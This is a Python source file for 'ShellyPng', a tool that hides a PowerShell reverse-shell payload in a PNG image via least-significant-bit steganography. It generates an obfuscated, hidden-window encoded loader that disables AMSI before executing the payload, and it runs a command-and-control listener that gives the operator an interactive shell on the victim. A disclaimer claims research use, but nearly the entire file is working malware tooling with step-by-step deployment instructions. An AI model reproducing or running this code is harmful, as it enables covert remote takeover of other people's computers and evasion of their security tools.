import base64
import socket
import ssl
import threading
import os
import random
import string
from PIL import Image
import inquirer
import argparse
import sys
import time
from colorama import init, Fore, Style
from tqdm import tqdm

# Initialize colorama for cross-platform colored terminal output
init()

# Improved ASCII Art Banner
BANNER = f"""
{Fore.CYAN}
  ███████╗██╗  ██╗███████╗██╗     ██╗  ██╗   ██╗    ██████╗ ███╗   ██╗ ██████╗ 
  ██╔════╝██║  ██║██╔════╝██║     ██║   ╚██╗ ██╔╝   ██╔══██╗████╗  ██║██╔════╝ 
  ███████╗███████║█████╗  ██║     ██║    ╚████╔╝    ██████╔╝██╔██╗ ██║██║  ███╗
  ╚════██║██╔══██║██╔══╝  ██║     ██║     ╚██╔╝     ██╔═══╝ ██║╚██╗██║██║   ██║
  ███████║██║  ██║███████╗███████╗█████╗   ██║      ██║     ██║ ╚████║╚██████╔╝
  ╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚════╝   ╚═╝      ╚═╝     ╚═╝  ╚═══╝ ╚═════╝ 
{Style.RESET_ALL}
{Fore.RED}  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄{Style.RESET_ALL} 
{Fore.YELLOW} █         █ █         █ █         █ █         █ █         █{Style.RESET_ALL}
{Fore.GREEN} █    ▄▄▄▄▄█ █    ▄▄▄▄▄█ █    ▄▄▄▄▄█ █    ▄▄▄▄▄█ █    ▄▄▄▄▄█{Style.RESET_ALL}
{Fore.BLUE} █   █▄▄▄▄▄  █   █▄▄▄▄▄  █   █▄▄▄▄▄  █   █▄▄▄▄▄  █   █▄▄▄▄▄ {Style.RESET_ALL}
{Fore.MAGENTA} █    ▄▄▄▄▄█ █    ▄▄▄▄▄█ █    ▄▄▄▄▄█ █    ▄▄▄▄▄█ █    ▄▄▄▄▄█{Style.RESET_ALL}
{Fore.RED} █   █       █   █       █   █       █   █       █   █      {Style.RESET_ALL}
{Fore.CYAN} █   █▄▄▄▄▄  █   █▄▄▄▄▄  █   █▄▄▄▄▄  █   █▄▄▄▄▄  █   █      {Style.RESET_ALL}
{Fore.WHITE} █▄▄▄▄▄▄▄▄▄█  █▄▄▄▄▄▄▄▄▄█  █▄▄▄▄▄▄▄▄▄█  █▄▄▄▄▄▄▄▄▄█  █▄▄▄▄▄▄▄▄▄█{Style.RESET_ALL}

{Fore.YELLOW}  🔍 LSB Image Steganography Tool ⚡ {Style.RESET_ALL}      {Fore.RED}v1.0.0{Style.RESET_ALL}
"""

# Default configurations
DEFAULT_C2_HOST = "0.0.0.0"  # Listen on all interfaces by default
DEFAULT_C2_PORT = 45913
DEFAULT_IMAGE = "decoy_image.png"
DEFAULT_OUTPUT = "output_image.png"

class ShellyPng:
    """
    ShellyPng: Image Steganography Research Tool
    
    This tool allows you to embed PowerShell payloads within images using 
    LSB (Least Significant Bit) steganography, making them virtually undetectable
    to casual observation and basic scanning tools.
    """
    def __init__(self, c2_host, c2_port, image_path, output_path, verbose=False):
        self.c2_host = c2_host
        self.c2_port = c2_port
        self.image_path = image_path
        self.output_path = output_path
        self.verbose = verbose
        self.listen_host = "0.0.0.0"  # Always listen on all interfaces
        
    def log(self, message, level="info"):
        """Print log messages based on verbosity and level"""
        if not self.verbose and level == "debug":
            return
            
        prefix = {
            "info": f"{Fore.BLUE}[*]{Style.RESET_ALL}",
            "success": f"{Fore.GREEN}[+]{Style.RESET_ALL}",
            "warning": f"{Fore.YELLOW}[!]{Style.RESET_ALL}",
            "error": f"{Fore.RED}[✗]{Style.RESET_ALL}",
            "debug": f"{Fore.MAGENTA}[D]{Style.RESET_ALL}"
        }
        
        print(f"{prefix.get(level, '[*]')} {message}")

    def generate_payload(self):
        """Generate the PowerShell payload with reverse shell functionality"""
        self.log("Generating payload...", "debug")
        
        payload = f"""
function Reverse-Shell {{
    $client = New-Object System.Net.Sockets.TCPClient("{self.c2_host}", {self.c2_port})
    $stream = $client.GetStream()
    $writer = New-Object System.IO.StreamWriter($stream)
    $reader = New-Object System.IO.StreamReader($stream)
    $writer.AutoFlush = $true
    $computerName = [System.Environment]::MachineName
    $username = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
    $writer.WriteLine("Connected to $computerName as $username")
    while ($true) {{
        $cmd = $reader.ReadLine()
        if ($cmd -eq "exit") {{ break }}
        try {{
            $output = Invoke-Expression $cmd 2>&1 | Out-String
            $writer.WriteLine($output)
        }} catch {{
            $writer.WriteLine($_.Exception.Message)
        }}
    }}
    $client.Close()
}}
Reverse-Shell
"""
        return payload

    def embed_payload(self, payload):
        """Embed the payload into the image using LSB steganography"""
        self.log(f"Loading source image: {self.image_path}", "info")
        
        # Check if image exists
        if not os.path.exists(self.image_path):
            self.log(f"Image not found: {self.image_path}. Creating a blank image.", "warning")
            img = Image.new("RGB", (400, 300), color=(240, 240, 240))
            img.save(self.image_path)
            
        img = Image.open(self.image_path).convert("RGB")
        pixels = img.load()
        width, height = img.size
        
        # Convert payload to binary
        payload_bytes = payload.encode()
        payload_size = len(payload_bytes)
        
        # Check if payload can fit in the image
        max_bytes = (width * height * 3) // 8
        if payload_size > max_bytes:
            self.log(f"Payload too large for this image! Max size: {max_bytes} bytes, Payload: {payload_size} bytes", "error")
            return False
            
        self.log(f"Image capacity: {max_bytes} bytes, Payload size: {payload_size} bytes", "debug")
        
        # Add size header (4 bytes) to know how much data to extract
        size_bytes = payload_size.to_bytes(4, byteorder='big')
        data = size_bytes + payload_bytes
        
        # Convert data to bits
        bits = ''.join(format(byte, '08b') for byte in data)
        
        self.log("Embedding payload into image...", "info")
        
        # Use tqdm to show progress bar
        bit_index = 0
        with tqdm(total=len(bits), desc="Embedding", unit="bits", disable=not self.verbose) as pbar:
            for y in range(height):
                for x in range(width):
                    r, g, b = pixels[x, y]
                    
                    # Embed in red channel
                    if bit_index < len(bits):
                        r = (r & ~1) | int(bits[bit_index])
                        bit_index += 1
                        pbar.update(1)
                    
                    # Embed in green channel
                    if bit_index < len(bits):
                        g = (g & ~1) | int(bits[bit_index])
                        bit_index += 1
                        pbar.update(1)
                    
                    # Embed in blue channel
                    if bit_index < len(bits):
                        b = (b & ~1) | int(bits[bit_index])
                        bit_index += 1
                        pbar.update(1)
                    
                    pixels[x, y] = (r, g, b)
                    
                    # Check if we've embedded all bits
                    if bit_index >= len(bits):
                        break
                
                if bit_index >= len(bits):
                    break
        
        self.log(f"Saving stego image to: {self.output_path}", "info")
        img.save(self.output_path, quality=100)
        return True

    def generate_random_string(self, length=8):
        """Generate a random string for variable names to enhance polymorphism"""
        return ''.join(random.choices(string.ascii_letters, k=length))

    def obfuscate_string(self, s):
        """Obfuscate a string by encoding it in a way that evades detection"""
        # Convert to Base64 and split into chunks to avoid simple pattern matching
        b64 = base64.b64encode(s.encode('utf-16le')).decode()
        # Split into random chunks
        chunk_size = random.randint(10, 20)
        chunks = [b64[i:i+chunk_size] for i in range(0, len(b64), chunk_size)]
        # Join chunks with PowerShell concatenation
        return '("' + '"+"'.join(chunks) + '")'

    def generate_extraction_command(self):
        """Generate a polymorphic PowerShell command to extract and execute the payload"""
        self.log("Generating extraction command...", "debug")
        
        # Generate random variable names for polymorphism
        img_var = self.generate_random_string()
        width_var = self.generate_random_string()
        height_var = self.generate_random_string()
        bits_var = self.generate_random_string()
        x_var = self.generate_random_string()
        y_var = self.generate_random_string()
        pixel_var = self.generate_random_string()
        bytes_var = self.generate_random_string()
        i_var = self.generate_random_string()
        byte_var = self.generate_random_string()
        size_var = self.generate_random_string()
        data_var = self.generate_random_string()
        payload_var = self.generate_random_string()

        # Obfuscate strings to evade detection
        drawing_assembly = self.obfuscate_string("System.Drawing")
        path = self.obfuscate_string(os.path.basename(self.output_path))
        encoding = self.obfuscate_string("UTF8")

        # Polymorphic extraction command with obfuscation
        extraction_ps = f"""
Add-Type -AssemblyName {drawing_assembly}
${img_var} = [System.Drawing.Image]::FromFile({path})
${width_var} = ${img_var}.Width
${height_var} = ${img_var}.Height
${bits_var} = ""
# Extract bits from image
for (${y_var} = 0; ${y_var} -lt ${height_var}; ${y_var}++) {{
    for (${x_var} = 0; ${x_var} -lt ${width_var}; ${x_var}++) {{
        ${pixel_var} = ${img_var}.GetPixel(${x_var}, ${y_var})
        ${bits_var} += [Convert]::ToString(${pixel_var}.R -band 1)
        ${bits_var} += [Convert]::ToString(${pixel_var}.G -band 1)
        ${bits_var} += [Convert]::ToString(${pixel_var}.B -band 1)
        # Break early if we've read enough bits
        if (${bits_var}.Length -ge 32 + 8 * [BitConverter]::ToInt32([Convert]::FromBase64String("AAAAAAA="), 0)) {{
            break
        }}
    }}
    if (${bits_var}.Length -ge 32 + 8 * [BitConverter]::ToInt32([Convert]::FromBase64String("AAAAAAA="), 0)) {{
        break
    }}
}}
# First 32 bits (4 bytes) give us the size
${bytes_var} = @()
for (${i_var} = 0; ${i_var} -lt 32; ${i_var} += 8) {{
    ${byte_var} = ${bits_var}.Substring(${i_var}, 8)
    ${bytes_var} += [Convert]::ToByte(${byte_var}, 2)
}}
${size_var} = [BitConverter]::ToInt32(${bytes_var}, 0)
# Extract actual data
${data_var} = @()
for (${i_var} = 32; ${i_var} -lt 32 + (8 * ${size_var}); ${i_var} += 8) {{
    ${byte_var} = ${bits_var}.Substring(${i_var}, [Math]::Min(8, ${bits_var}.Length - ${i_var}))
    ${data_var} += [Convert]::ToByte(${byte_var}, 2)
}}
${payload_var} = [System.Text.Encoding]::${encoding}.GetString(${data_var})
# Bypass potential detection
$amsi = [Ref].Assembly.GetType('System.Management.Automation.Amsi'+'Utils')
if ($amsi) {{$amsi.GetField('amsiInitF'+'ailed','NonPublic,Static').SetValue($null,$true)}}
# Execute payload
IEX ${payload_var}
"""
        # Encode the command in Base64 with random padding
        encoded_cmd = base64.b64encode(extraction_ps.encode('utf-16le')).decode()
        # Add random padding to the Base64 string
        padding = ''.join(random.choices(string.ascii_letters + string.digits, k=random.randint(5, 15)))
        encoded_cmd = encoded_cmd + padding
        
        # Return the one-liner PowerShell command
        return f'powershell -WindowStyle Hidden -EncodedCommand {encoded_cmd}'

    def start_c2_server(self):
        """Start the C2 server to receive connections from the payload"""
        self.log(f"Starting C2 server on {self.listen_host}:{self.c2_port}...", "info")
        
        try:
            # Check if we need SSL certificates
            use_ssl = False
            context = None
            
            if use_ssl:
                if not os.path.exists("server.crt") or not os.path.exists("server.key"):
                    self.log("SSL certificates not found. Generating new ones...", "warning")
                    os.system(
                        "openssl req -x509 -newkey rsa:2048 -nodes "
                        "-keyout server.key -out server.crt -days 365 "
                        "-subj '/C=US/ST=State/L=City/O=ShellyPng/OU=Research/CN=localhost'"
                    )
                context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
                context.load_cert_chain(certfile="server.crt", keyfile="server.key")
            
            # Create server socket
            server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            
            # Bind to listen_host instead of c2_host (for local listening)
            server_socket.bind((self.listen_host, self.c2_port))
            server_socket.listen(5)
            
            self.log(f"C2 Server listening on {self.listen_host}:{self.c2_port}", "success")
            self.log(f"Targets will connect back to: {self.c2_host}:{self.c2_port}", "info")
            self.log("Waiting for connections...", "info")
            
            while True:
                client_socket, addr = server_socket.accept()
                self.log(f"New connection from {addr[0]}:{addr[1]}", "success")
                threading.Thread(target=self.handle_client, args=(client_socket, addr)).start()
                
        except Exception as e:
            self.log(f"C2 Server failed: {e}", "error")
            raise

    def handle_client(self, client_socket, addr):
        """Handle client connections to the C2 server"""
        try:
            client_stream = client_socket.makefile('rw')
            
            # Print the initial connection information
            initial_response = client_stream.readline().strip()
            print(f"\n{Fore.GREEN}[{addr[0]}] {initial_response}{Style.RESET_ALL}")
            
            # Interactive shell
            while True:
                try:
                    cmd = input(f"{Fore.CYAN}[{addr[0]}]{Style.RESET_ALL} > ")
                    if cmd.lower() in ["exit", "quit", "bye"]:
                        self.log("Closing connection...", "info")
                        client_stream.write("exit\n")
                        client_stream.flush()
                        break
                    
                    # Send command to target
                    client_stream.write(cmd + "\n")
                    client_stream.flush()
                    
                    # Get response (this is a simple implementation - could be improved)
                    response = ""
                    while True:
                        line = client_stream.readline()
                        if not line or line.strip() == "":
                            break
                        response += line
                    
                    # Print response
                    if response.strip():
                        print(f"{response.strip()}")
                        
                except KeyboardInterrupt:
                    choice = input(f"\n{Fore.YELLOW}[!] Do you want to exit? (y/n): {Style.RESET_ALL}")
                    if choice.lower() in ["y", "yes"]:
                        client_stream.write("exit\n")
                        client_stream.flush()
                        break
                        
        except Exception as e:
            self.log(f"Error handling client: {e}", "error")
        finally:
            client_socket.close()
            self.log(f"Connection with {addr[0]} closed", "warning")

def print_banner():
    """Print the ShellyPng banner"""
    print(BANNER)
    print(f"{Fore.YELLOW}⭐ An open-source research tool for image steganography ⭐{Style.RESET_ALL}\n")
    print(f"{Fore.CYAN}GitHub: https://github.com/ash/shellypng{Style.RESET_ALL}")
    print()

def print_disclaimer():
    """Print the legal disclaimer"""
    disclaimer = f"""
{Fore.RED}⚠️ LEGAL DISCLAIMER ⚠️{Style.RESET_ALL}

ShellyPng is designed for educational and research purposes ONLY. 
The authors and contributors are NOT responsible for any misuse 
or damage caused by this program.

By using this software, you agree to use it responsibly and ethically.
Always obtain proper authorization before testing on any systems.

{Fore.YELLOW}This tool should only be used in controlled environments with proper authorization.{Style.RESET_ALL}
"""
    print(disclaimer)
    
    # Ask for confirmation
    if not os.getenv('SHELLYPNG_SUPPRESS_DISCLAIMER'):
        try:
            response = input(f"{Fore.YELLOW}Do you understand and agree to use this tool responsibly? (y/n): {Style.RESET_ALL}")
            if response.lower() not in ['y', 'yes']:
                print(f"{Fore.RED}Exiting...{Style.RESET_ALL}")
                sys.exit(0)
        except KeyboardInterrupt:
            print(f"\n{Fore.RED}Exiting...{Style.RESET_ALL}")
            sys.exit(0)
    print()

# Custom text input class to fix the input duplication issue
class FixedText(inquirer.questions.Text):
    def _get_input_message(self):
        """Override to provide a clean prompt without duplication"""
        return f"[?] {self.message}: "

# Patch inquirer.Text to use our fixed version
inquirer.questions.Text = FixedText

def interactive_mode():
    """Run the tool in interactive mode with a menu"""
    print_banner()
    print_disclaimer()
    
    # Define simple input function to avoid the duplication issue
    def get_input(prompt, default=""):
        try:
            value = input(f"{Fore.YELLOW}[?]{Style.RESET_ALL} {prompt} [{default}]: ")
            return value if value else default
        except KeyboardInterrupt:
            print(f"\n{Fore.RED}Operation cancelled.{Style.RESET_ALL}")
            sys.exit(0)
    
    try:
        # Get configuration values with fixed input method
        c2_host = get_input("C2 callback address (IP/hostname that target will connect back to)", DEFAULT_C2_HOST)
        c2_port = int(get_input("C2 server port", str(DEFAULT_C2_PORT)))
        image_path = get_input("Input image for steganography", DEFAULT_IMAGE)
        output_path = get_input("Output image path", DEFAULT_OUTPUT)
        verbose_input = get_input("Enable verbose output? (y/n)", "y")
        verbose = verbose_input.lower() in ['y', 'yes', 'true']
        
        # Validate IP address format or use hostname
        try:
            socket.inet_aton(c2_host)
        except socket.error:
            # Not a valid IP address format, assuming it's a hostname
            pass
            
        # Initialize ShellyPng
        shellypng = ShellyPng(c2_host, c2_port, image_path, output_path, verbose)
        
        # Generate and embed payload
        payload = shellypng.generate_payload()
        success = shellypng.embed_payload(payload)
        
        if not success:
            return
            
        print()
        shellypng.log(f"Payload successfully embedded into {output_path}", "success")
        
        # Generate extraction command
        extraction_cmd = shellypng.generate_extraction_command()
        print()
        shellypng.log("Extraction command:", "info")
        print(f"{Fore.GREEN}{extraction_cmd}{Style.RESET_ALL}")
        print()
        
        # Ask if user wants to start C2 server
        start_server_input = get_input("Do you want to start the C2 server now? (y/n)", "y")
        start_server = start_server_input.lower() in ['y', 'yes', 'true']
        
        if start_server:
            # Start C2 server in a separate thread
            server_thread = threading.Thread(target=shellypng.start_c2_server, daemon=True)
            server_thread.start()
            
            # Display instructions
            print()
            shellypng.log("Instructions:", "info")
            print(f"1. Transfer {output_path} to the target system")
            print(f"2. Run the extraction command on the target system")
            print(f"3. Wait for the connection back to this C2 server")
            print()
            print(f"{Fore.YELLOW}Press Ctrl+C to exit the server{Style.RESET_ALL}")
            
            # Wait for server thread to complete (will run until Ctrl+C)
            try:
                while server_thread.is_alive():
                    time.sleep(0.1)
            except KeyboardInterrupt:
                print(f"\n{Fore.YELLOW}Server stopped.{Style.RESET_ALL}")
        
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}Operation cancelled.{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}[✗] Error: {e}{Style.RESET_ALL}")

def cli_mode():
    """Run the tool in command-line mode with arguments"""
    parser = argparse.ArgumentParser(description="ShellyPng - Image Steganography Research Tool")
    parser.add_argument("-H", "--host", help=f"C2 callback address (IP/hostname that target will connect back to)", default=DEFAULT_C2_HOST)
    parser.add_argument("-p", "--port", help=f"C2 server port (default: {DEFAULT_C2_PORT})", type=int, default=DEFAULT_C2_PORT)
    parser.add_argument("-i", "--image", help=f"Input image path (default: {DEFAULT_IMAGE})", default=DEFAULT_IMAGE)
    parser.add_argument("-o", "--output", help=f"Output image path (default: {DEFAULT_OUTPUT})", default=DEFAULT_OUTPUT)
    parser.add_argument("-s", "--server", help="Start C2 server immediately", action="store_true")
    parser.add_argument("-v", "--verbose", help="Enable verbose output", action="store_true")
    parser.add_argument("-q", "--quiet", help="Suppress banner and disclaimer", action="store_true")
    parser.add_argument("-c", "--command-only", help="Only output the extraction command", action="store_true")
    parser.add_argument("-l", "--listen", help="Listen address for C2 server (default: 0.0.0.0)", default="0.0.0.0")
    
    args = parser.parse_args()
    
    if not args.quiet:
        print_banner()
        print_disclaimer()
    
    # Initialize ShellyPng
    shellypng = ShellyPng(args.host, args.port, args.image, args.output, args.verbose)
    shellypng.listen_host = args.listen
    
    # Generate and embed payload
    payload = shellypng.generate_payload()
    success = shellypng.embed_payload(payload)
    
    if not success:
        return 1
        
    # Generate extraction command
    extraction_cmd = shellypng.generate_extraction_command()
    
    if args.command_only:
        print(extraction_cmd)
        return 0
        
    shellypng.log(f"Payload successfully embedded into {args.output}", "success")
    shellypng.log("Extraction command:", "info")
    print(f"{Fore.GREEN}{extraction_cmd}{Style.RESET_ALL}")
    
    # Start C2 server if requested
    if args.server:
        try:
            shellypng.start_c2_server()
        except KeyboardInterrupt:
            print(f"\n{Fore.YELLOW}Server stopped.{Style.RESET_ALL}")
    
    return 0

def main():
    """Main entry point"""
    # Check if required packages are installed
    try:
        import colorama
        import inquirer
        import tqdm
        from PIL import Image
    except ImportError:
        print("ERROR: Missing required packages. Please install them using:")
        print("pip install colorama inquirer tqdm pillow")
        return 1
        
    # Check if arguments were provided
    if len(sys.argv) > 1:
        return cli_mode()
    else:
        interactive_mode()
        return 0

if __name__ == "__main__":
    try:
        sys.exit(main())
    except Exception as e:
        print(f"{Fore.RED}[✗] Fatal error: {e}{Style.RESET_ALL}")
        sys.exit(1)
